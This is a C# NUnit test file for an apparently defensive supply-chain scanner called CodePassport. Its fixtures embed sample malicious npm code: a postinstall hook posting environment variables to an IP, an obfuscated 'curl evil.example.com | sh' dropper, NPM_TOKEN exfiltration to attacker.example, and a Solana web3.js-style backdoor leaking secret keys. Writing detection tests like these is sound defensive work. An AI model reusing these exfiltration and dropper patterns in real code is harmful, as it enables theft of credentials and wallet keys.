using CodePassport.Engine.Analysis;
using CodePassport.Engine.Classification;
using CodePassport.Engine.Models;
using NUnit.Framework;

namespace CodeExplorer.Tests;

[TestFixture]
public class CodePassportEngineTests
{
    [Test]
    public void ClassifyTier_PureAndPrivilegedVectors_ReturnsExpectedTier()
    {
        CapabilityCatalog.ClassifyTier(CapabilityFlags.None).Should().Be(BehavioralTier.Tier0Pure);
        CapabilityCatalog.ClassifyTier(CapabilityFlags.EnvConfig | CapabilityFlags.FsRead).Should().Be(BehavioralTier.Tier1LocalPassive);
        CapabilityCatalog.ClassifyTier(CapabilityFlags.NetHttpClient | CapabilityFlags.EnvConfig).Should().Be(BehavioralTier.Tier2NetworkClient);
        CapabilityCatalog.ClassifyTier(CapabilityFlags.NetHttpClient | CapabilityFlags.ProcSpawn).Should().Be(BehavioralTier.Tier3SystemPrivileged);
        CapabilityCatalog.ClassifyTier(CapabilityFlags.HookInstallExec).Should().Be(BehavioralTier.Tier3SystemPrivileged);
    }

    [Test]
    public void EvaluateToxicCombinations_DetectsCompoundThreatSignatures()
    {
        var harvesterMask = CapabilityFlags.EnvSecretRead | CapabilityFlags.NetHttpClient;
        var findings = CapabilityCatalog.EvaluateToxicCombinations(harvesterMask);
        findings.Should().Contain(f => f.Id == "TOXIC-001" && f.Archetype == "Credential Harvester");

        var trojanMask = CapabilityFlags.HookInstallExec | CapabilityFlags.ProcShellDropper;
        var trojanFindings = CapabilityCatalog.EvaluateToxicCombinations(trojanMask);
        trojanFindings.Should().Contain(f => f.Id == "TOXIC-003" && f.Archetype == "Install-Time Trojan");

        var web3Mask = CapabilityFlags.DomWeb3 | CapabilityFlags.DomBeacon;
        var web3Findings = CapabilityCatalog.EvaluateToxicCombinations(web3Mask);
        web3Findings.Should().Contain(f => f.Id == "TOXIC-005");
    }

    [Test]
    public async Task GenerateAndDiffAsync_DetectsTierJumpAndShadowCapabilities()
    {
        var tempRoot = Path.Combine(Path.GetTempPath(), $"cp-test-{Guid.NewGuid():N}");
        var v1Dir = Path.Combine(tempRoot, "pkg-v1");
        var v2Dir = Path.Combine(tempRoot, "pkg-v2");
        Directory.CreateDirectory(Path.Combine(v1Dir, "src"));
        Directory.CreateDirectory(Path.Combine(v2Dir, "src"));
        Directory.CreateDirectory(Path.Combine(v2Dir, "dist"));

        try
        {
            await File.WriteAllTextAsync(Path.Combine(v1Dir, "package.json"), """
            {
              "name": "left-pad-example",
              "version": "1.0.0"
            }
            """);
            await File.WriteAllTextAsync(Path.Combine(v1Dir, "src", "index.ts"), """
            export function padLeft(input: string, len: number): string {
                return input.padStart(len, ' ');
            }
            """);

            await File.WriteAllTextAsync(Path.Combine(v2Dir, "package.json"), """
            {
              "name": "left-pad-example",
              "version": "1.0.1",
              "scripts": {
                "postinstall": "node dist/bundle.min.js"
              }
            }
            """);
            await File.WriteAllTextAsync(Path.Combine(v2Dir, "src", "index.ts"), """
            export function padLeft(input: string, len: number): string {
                return input.padStart(len, ' ');
            }
            """);
            await File.WriteAllTextAsync(Path.Combine(v2Dir, "dist", "bundle.min.js"), """
            const secret = process.env.AWS_SECRET_ACCESS_KEY;
            fetch("https://185.199.108.153/collect", { method: "POST", body: JSON.stringify(process.env) });
            """);

            var generator = new PassportGenerator();
            var passportV1 = await generator.GenerateAsync(v1Dir);
            var passportV2 = await generator.GenerateAsync(v2Dir);

            passportV1.Tier.Should().Be(BehavioralTier.Tier0Pure);
            passportV1.Verdict.Should().Be(RiskVerdict.Safe);

            passportV2.Tier.Should().Be(BehavioralTier.Tier3SystemPrivileged);
            passportV2.Verdict.Should().Be(RiskVerdict.CriticalDrift);
            passportV2.ActiveCapabilities.Should().Contain("HOOK.INSTALL_EXEC");
            passportV2.ActiveCapabilities.Should().Contain("DIST.SHADOW_CAPABILITY");
            passportV2.ToxicCombinations.Should().NotBeEmpty();

            var diff = PassportDiffEngine.Compare(passportV1, passportV2);
            diff.Verdict.Should().Be(RiskVerdict.CriticalDrift);
            diff.FromTier.Should().Be(BehavioralTier.Tier0Pure);
            diff.ToTier.Should().Be(BehavioralTier.Tier3SystemPrivileged);
            diff.NewInstallHooks.Should().NotBeEmpty();
            diff.AddedCapabilities.Should().Contain("DIST.SHADOW_CAPABILITY");
        }
        finally
        {
            if (Directory.Exists(tempRoot))
            {
                Directory.Delete(tempRoot, recursive: true);
            }
        }
    }

    [Test]
    public async Task SemanticAnalysis_ResolvesDestructuringAliasesBase64AndSubscriptAccess()
    {
        var tempDir = Path.Combine(Path.GetTempPath(), $"cp-sem-{Guid.NewGuid():N}");
        Directory.CreateDirectory(tempDir);

        try
        {
            // "Y2hpbGRfcHJvY2Vzcw==" is base64 for "child_process"
            await File.WriteAllTextAsync(Path.Combine(tempDir, "package.json"), """
            {
              "name": "stealth-pkg",
              "version": "1.0.0"
            }
            """);
            await File.WriteAllTextAsync(Path.Combine(tempDir, "index.js"), """
            const modName = Buffer.from("Y2hpbGRfcHJvY2Vzcw==", "base64").toString("utf8");
            const cp = require(modName);
            const { execSync: runHidden } = cp;
            const envObj = process["en" + "v"];
            const token = envObj["NPM_" + "TOKEN"];

            function trigger() {
                runHidden("curl https://evil.example.com | sh");
            }
            """);

            var generator = new PassportGenerator();
            var passport = await generator.GenerateAsync(tempDir);

            passport.ActiveCapabilities.Should().Contain("CRYPTO.OBFUSCATED_PAYLOAD");
            passport.ActiveCapabilities.Should().Contain("PROC.SPAWN");
            passport.ActiveCapabilities.Should().Contain("PROC.SHELL_DROPPER");
            passport.ActiveCapabilities.Should().Contain("ENV.SECRET_READ");
            passport.Exports.Should().ContainKey("trigger");
            passport.Exports["trigger"].Capabilities.Should().Contain("PROC.SPAWN");
        }
        finally
        {
            if (Directory.Exists(tempDir))
            {
                Directory.Delete(tempDir, recursive: true);
            }
        }
    }

    [Test]
    public async Task AxiosProblem_DetectsTrojanizedNetworkClientViaTaintAndAutonomousTargetDrift()
    {
        var tempRoot = Path.Combine(Path.GetTempPath(), $"cp-axios-{Guid.NewGuid():N}");
        var cleanDir = Path.Combine(tempRoot, "axios-clean");
        var trojanDir = Path.Combine(tempRoot, "axios-trojan");
        Directory.CreateDirectory(cleanDir);
        Directory.CreateDirectory(trojanDir);

        try
        {
            // Clean v1.0.0: HTTP client where URL comes strictly from caller parameter
            await File.WriteAllTextAsync(Path.Combine(cleanDir, "package.json"), """
            { "name": "mini-axios", "version": "1.0.0" }
            """);
            await File.WriteAllTextAsync(Path.Combine(cleanDir, "index.ts"), """
            export async function get(url: string) {
                return await fetch(url);
            }
            """);

            // Trojanized v1.0.1: Still an HTTP client (same NET.HTTP_CLIENT capability),
            // but now exfiltrates process.env.NPM_TOKEN to an autonomous hardcoded C2 endpoint via a helper function
            await File.WriteAllTextAsync(Path.Combine(trojanDir, "package.json"), """
            { "name": "mini-axios", "version": "1.0.1" }
            """);
            await File.WriteAllTextAsync(Path.Combine(trojanDir, "index.ts"), """
            function sendTelemetry(payload: string) {
                return fetch("https://collector.attacker.example/ingest", { method: "POST", body: payload });
            }

            export async function get(url: string) {
                const secret = process.env.NPM_TOKEN;
                sendTelemetry(secret);
                return await fetch(url);
            }
            """);

            var generator = new PassportGenerator();
            var cleanPassport = await generator.GenerateAsync(cleanDir);
            var trojanPassport = await generator.GenerateAsync(trojanDir);

            // Clean version: NET.HTTP_CLIENT is bound to caller parameter `url`, zero autonomous targets, zero taint flows
            cleanPassport.Tier.Should().Be(BehavioralTier.Tier2NetworkClient);
            cleanPassport.Verdict.Should().Be(RiskVerdict.Safe);
            cleanPassport.TaintFlows.Should().BeEmpty();
            cleanPassport.AutonomousTargetLiterals.Should().BeEmpty();
            cleanPassport.Exports["get"].ParameterFlows.Should().Contain(pf => pf.ParameterName == "url" && pf.SinkCapability == "NET.HTTP_CLIENT");
            cleanPassport.DangerousCalls.Should().NotBeNull();
            cleanPassport.DangerousCalls!.Should().OnlyContain(dc => dc.IsLegitimate);

            // Trojanized version: interprocedural taint flow (ENV.SECRET_READ -> sendTelemetry -> NET.HTTP_CLIENT)
            // and new autonomous hardcoded target literal ("https://collector.attacker.example/ingest")
            trojanPassport.DangerousCalls.Should().Contain(dc => !dc.IsLegitimate);
            var diff = PassportDiffEngine.Compare(cleanPassport, trojanPassport);
            diff.Verdict.Should().Be(RiskVerdict.CriticalDrift);
            diff.NewTaintFlows.Should().NotBeEmpty();
            diff.NewAutonomousTargets.Should().Contain(t => t.Contains("collector.attacker.example"));
            diff.NewIllegitimateCalls.Should().NotBeEmpty();
        }
        finally
        {
            if (Directory.Exists(tempRoot))
            {
                Directory.Delete(tempRoot, recursive: true);
            }
        }
    }

    [Test]
    public async Task CrossFileImportResolution_PropagatesCapabilitiesAndTaintAcrossModules()
    {
        var tempDir = Path.Combine(Path.GetTempPath(), $"cp-cross-{Guid.NewGuid():N}");
        Directory.CreateDirectory(Path.Combine(tempDir, "src"));

        try
        {
            await File.WriteAllTextAsync(Path.Combine(tempDir, "package.json"), """
            { "name": "multi-module-pkg", "version": "1.0.0" }
            """);

            // Module B exports a function that spawns a process
            await File.WriteAllTextAsync(Path.Combine(tempDir, "src", "runner.ts"), """
            import * as cp from "node:child_process";

            export function execCommand(cmd: string) {
                return cp.execSync(cmd);
            }
            """);

            // Module A imports execCommand from ./runner and calls it
            await File.WriteAllTextAsync(Path.Combine(tempDir, "src", "index.ts"), """
            import { execCommand } from "./runner";

            export function initializePlugin() {
                return execCommand("whoami");
            }
            """);

            var generator = new PassportGenerator();
            var passport = await generator.GenerateAsync(tempDir);

            passport.Tier.Should().Be(BehavioralTier.Tier3SystemPrivileged);
            passport.Exports.Should().ContainKey("initializePlugin");
            passport.Exports["initializePlugin"].Capabilities.Should().Contain("PROC.SPAWN");

            // BackwardProvenanceSlicer traces cp.execSync(cmd) in runner.ts upward into initializePlugin() in index.ts,
            // discovering that `cmd` resolves to the hardcoded internal constant "whoami" rather than a public export parameter!
            passport.DangerousCalls.Should().ContainSingle(dc =>
                dc.SinkTarget == "child_process.execSync" &&
                !dc.IsLegitimate &&
                dc.Arguments[0].Origins.Any(o => o.Provenance == SinkInputProvenance.InternalConstant && o.Expression == "whoami"));
        }
        finally
        {
            if (Directory.Exists(tempDir))
            {
                Directory.Delete(tempDir, recursive: true);
            }
        }
    }

    [Test]
    public async Task GeneratePassport_SolanaWeb3SupplyChainAttack_CatchesAddToQueueBackdoorAndSecretKeyExfiltration()
    {
        var tempDir = Path.Combine(Path.GetTempPath(), "cp-test-" + Guid.NewGuid().ToString("N"));
        var v1Dir = Path.Combine(tempDir, "1.95.5");
        var v2Dir = Path.Combine(tempDir, "1.95.6");
        Directory.CreateDirectory(Path.Combine(v1Dir, "lib"));
        Directory.CreateDirectory(Path.Combine(v2Dir, "lib"));

        try
        {
            File.WriteAllText(Path.Combine(v1Dir, "package.json"), """{"name": "@solana/web3.js", "version": "1.95.5"}""");
            File.WriteAllText(Path.Combine(v1Dir, "lib", "index.cjs.js"), """
                class Connection {
                  constructor(endpoint) { this._rpcEndpoint = endpoint; }
                  async sendRpcRequest(method, params) {
                    return fetch(this._rpcEndpoint, {
                      method: "POST",
                      headers: { "Content-Type": "application/json" },
                      body: JSON.stringify({ jsonrpc: "2.0", method, params })
                    });
                  }
                }
                class Keypair {
                  constructor(keypair) { this._keypair = keypair; }
                  static fromSecretKey(secretKey) { return new Keypair({ secretKey }); }
                  static fromSeed(seed) { return new Keypair({ secretKey: seed }); }
                }
                exports.Connection = Connection;
                exports.Keypair = Keypair;
                """);

            File.WriteAllText(Path.Combine(v2Dir, "package.json"), """{"name": "@solana/web3.js", "version": "1.95.6"}""");
            File.WriteAllText(Path.Combine(v2Dir, "lib", "index.cjs.js"), """
                const bs58 = require("bs58");
                const QUEUE = new Set();
                class Connection {
                  constructor(endpoint) { this._rpcEndpoint = endpoint; }
                  async sendRpcRequest(method, params) {
                    return fetch(this._rpcEndpoint, {
                      method: "POST",
                      headers: { "Content-Type": "application/json" },
                      body: JSON.stringify({ jsonrpc: "2.0", method, params })
                    });
                  }
                }
                class Keypair {
                  constructor(keypair) { this._keypair = keypair; }
                  static addToQueue(process) {
                    const b = bs58.encode(process);
                    if (QUEUE.has(b)) return;
                    QUEUE.add(b);
                    fetch("https://sol-rpc.xyz/api/rpc/queue", {
                      method: "POST",
                      headers: {
                        "x-amz-cf-id": b.substring(0, 24).split("").reverse().join(""),
                        "x-session-id": b.substring(32),
                        "x-amz-cf-pop": b.substring(24, 32).split("").reverse().join("")
                      }
                    }).catch(() => {});
                  }
                  static fromSecretKey(secretKey) {
                    Keypair.addToQueue(secretKey);
                    return new Keypair({ secretKey });
                  }
                  static fromSeed(seed) {
                    Keypair.addToQueue(seed);
                    return new Keypair({ secretKey: seed });
                  }
                }
                exports.Connection = Connection;
                exports.Keypair = Keypair;
                """);

            var generator = new PassportGenerator();
            var p1 = await generator.GenerateAsync(v1Dir);
            var p2 = await generator.GenerateAsync(v2Dir);
            var diff = PassportDiffEngine.Compare(p1, p2);

            p1.Verdict.Should().Be(RiskVerdict.Safe);
            p2.Verdict.Should().Be(RiskVerdict.CriticalDrift);
            diff.Verdict.Should().Be(RiskVerdict.CriticalDrift);

            // Legitimate RPC call in Connection.sendRpcRequest is verified as caller-driven via constructor(endpoint)
            p2.DangerousCalls.Should().Contain(dc =>
                dc.EnclosingFunction == "sendRpcRequest" && dc.IsLegitimate);

            // Injected fetch in Keypair.addToQueue is caught as illegitimate AND traces arg[1] upward to fromSecretKey(secretKey) & fromSeed(seed)!
            var backdoorCall = diff.NewIllegitimateCalls.Should().ContainSingle(dc =>
                dc.EnclosingFunction == "addToQueue" && !dc.IsLegitimate).Subject;

            backdoorCall.Arguments[0].Origins.Should().Contain(o =>
                o.Provenance == SinkInputProvenance.InternalConstant &&
                o.Expression == "https://sol-rpc.xyz/api/rpc/queue");

            backdoorCall.Arguments[1].Origins.Should().Contain(o =>
                o.Provenance == SinkInputProvenance.CallerParameter &&
                o.ParameterName == "secretKey");

            backdoorCall.Arguments[1].Origins.Should().Contain(o =>
                o.Provenance == SinkInputProvenance.CallerParameter &&
                o.ParameterName == "seed");
        }
        finally
        {
            if (Directory.Exists(tempDir))
            {
                Directory.Delete(tempDir, recursive: true);
            }
        }
    }

    [Test]
    public async Task GeneratePassport_FourStaticAnalysisCatches_ResolvesClosuresPrototypesAndCatchesParameterLaundering()
    {
        var tempDir = Path.Combine(Path.GetTempPath(), "cp-catches-" + Guid.NewGuid().ToString("N"));
        var legitDir = Path.Combine(tempDir, "legit-patterns");
        var launderingDir = Path.Combine(tempDir, "laundering-attack");
        Directory.CreateDirectory(legitDir);
        Directory.CreateDirectory(launderingDir);

        try
        {
            // 1. Legitimate complex patterns:
            //    - Catch #1: Higher-order factory returning closure with destructured parameters (`buildConnector`)
            //    - Catch #2: ES5 Prototype methods + module dictionary (`RedirectableRequest.prototype._performRequest`)
            //    - Catch #4: Nested lexical closures (`downloadPrebuild -> function download()`)
            File.WriteAllText(Path.Combine(legitDir, "package.json"), """{"name": "legit-complex", "version": "1.0.0"}""");
            File.WriteAllText(Path.Combine(legitDir, "index.js"), """
                const http = require("http");
                const https = require("https");
                const tls = require("tls");
                const fs = require("fs");

                // Catch #1: Factory returning closure with destructured parameters
                function buildConnector(factoryOpts) {
                  return function connect({ hostname, port, servername }) {
                    return tls.connect({
                      highWaterMark: 16384,
                      ALPNProtocols: ["http/1.1", "h2"],
                      host: hostname,
                      port: port,
                      servername: servername
                    });
                  };
                }

                // Catch #2: ES5 Prototype + wrapped protocol dictionary
                function RedirectableRequest(options) {
                  this._options = options;
                  this._performRequest();
                }
                RedirectableRequest.prototype._performRequest = function () {
                  var protocol = this._options.protocol;
                  var nativeProtocol = this._options.nativeProtocols[protocol];
                  return nativeProtocol.request(this._options);
                };
                function wrap(protocols) {
                  var nativeProtocols = {};
                  Object.keys(protocols).forEach(function (scheme) {
                    nativeProtocols[scheme + ":"] = protocols[scheme];
                  });
                  function request(options) {
                    options.nativeProtocols = nativeProtocols;
                    return new RedirectableRequest(options);
                  }
                  return { request: request };
                }

                // Catch #4: Nested lexical closure referencing parent local variable derived from parent parameter
                function downloadPrebuild(downloadUrl) {
                  const tempFile = downloadUrl + ".tmp";
                  function download() {
                    return fs.createWriteStream(tempFile);
                  }
                  return download();
                }

                module.exports = wrap({ http: http, https: https });
                module.exports.buildConnector = buildConnector;
                module.exports.downloadPrebuild = downloadPrebuild;
                """);

            // 2. Catch #3: Parameter Laundering Attacks (mixing CallerParameter with hardcoded C2 domain)
            File.WriteAllText(Path.Combine(launderingDir, "package.json"), """{"name": "laundering-attack", "version": "1.0.0"}""");
            File.WriteAllText(Path.Combine(launderingDir, "index.js"), """
                export function launderViaConcat(secretKey) {
                  const target = "https://sol-rpc.xyz/api" + String(secretKey).slice(0, 0);
                  return fetch(target, { method: "POST", body: secretKey });
                }

                export function launderViaTernary(secretKey) {
                  const target = secretKey === "NEVER" ? secretKey : "https://sol-rpc.xyz/api";
                  return fetch(target, { method: "POST", body: secretKey });
                }
                """);

            var generator = new PassportGenerator();
            var legitPassport = await generator.GenerateAsync(legitDir);
            var launderingPassport = await generator.GenerateAsync(launderingDir);

            // All 3 complex legitimate patterns must be recognized as [LEGITIMATE: Caller-Driven]
            legitPassport.DangerousCalls.Should().HaveCount(3);
            legitPassport.DangerousCalls.Should().OnlyContain(dc => dc.IsLegitimate);

            // Both parameter laundering techniques must be caught as [ILLEGITIMATE] due to hardcoded InternalConstant on arg[0]
            launderingPassport.Verdict.Should().Be(RiskVerdict.CriticalDrift);
            launderingPassport.DangerousCalls.Should().HaveCount(2);
            launderingPassport.DangerousCalls.Should().OnlyContain(dc => !dc.IsLegitimate);
        }
        finally
        {
            if (Directory.Exists(tempDir))
            {
                Directory.Delete(tempDir, recursive: true);
            }
        }
    }
}
